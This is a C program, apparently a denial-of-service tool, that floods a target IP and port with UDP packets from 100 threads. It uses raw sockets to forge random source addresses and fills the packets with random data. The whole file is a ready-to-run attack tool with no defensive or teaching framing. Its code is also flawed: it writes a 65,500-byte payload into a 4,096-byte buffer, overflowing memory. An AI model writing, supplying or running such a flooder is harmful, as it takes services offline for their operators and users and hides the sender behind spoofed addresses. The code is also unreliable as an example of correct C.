#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <time.h>

#define PAYLOAD_SIZE 65500
#define THREADS 100

// Calcular checksum IP
unsigned short checksum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    for (; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

// Generar IP aleatoria
in_addr_t random_ip() {
    unsigned char ip[4];
    ip[0] = rand() % 256;
    ip[1] = rand() % 256;
    ip[2] = rand() % 256;
    ip[3] = rand() % 256;
    return *(in_addr_t *)ip;
}

// Generar datos aleatorios
void generate_payload(char *data, int size) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < size - 1; i++)
        data[i] = charset[rand() % (sizeof(charset) - 1)];
    data[size - 1] = '\0';
}

// Estructura de argumentos para hilos
typedef struct {
    char target_ip[16];
    int target_port;
    int sock;
} thread_args;

void *attack_thread(void *arg) {
    thread_args *args = (thread_args *)arg;
    struct sockaddr_in sin;
    char packet[4096];

    sin.sin_family = AF_INET;
    sin.sin_port = htons(args->target_port);
    sin.sin_addr.s_addr = inet_addr(args->target_ip);

    while (1) {
        memset(packet, 0, sizeof(packet));

        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
        char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

        generate_payload(data, PAYLOAD_SIZE);

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->saddr = random_ip();
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum((unsigned short *)iph, iph->ihl << 1);

        udph->source = htons(rand() % 65535);
        udph->dest = htons(args->target_port);
        udph->len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
        udph->check = 0;

        sendto(args->sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Uso: %s <IP destino> <puerto destino>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        return 1;
    }

    pthread_t threads[THREADS];
    thread_args args;

    strncpy(args.target_ip, argv[1], 15);
    args.target_port = atoi(argv[2]);
    args.sock = sock;

    for (int i = 0; i < THREADS; i++) {
        if (pthread_create(&threads[i], NULL, attack_thread, &args) != 0) {
            perror("pthread_create");
            return 1;
        }
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    close(sock);
    return 0;
}
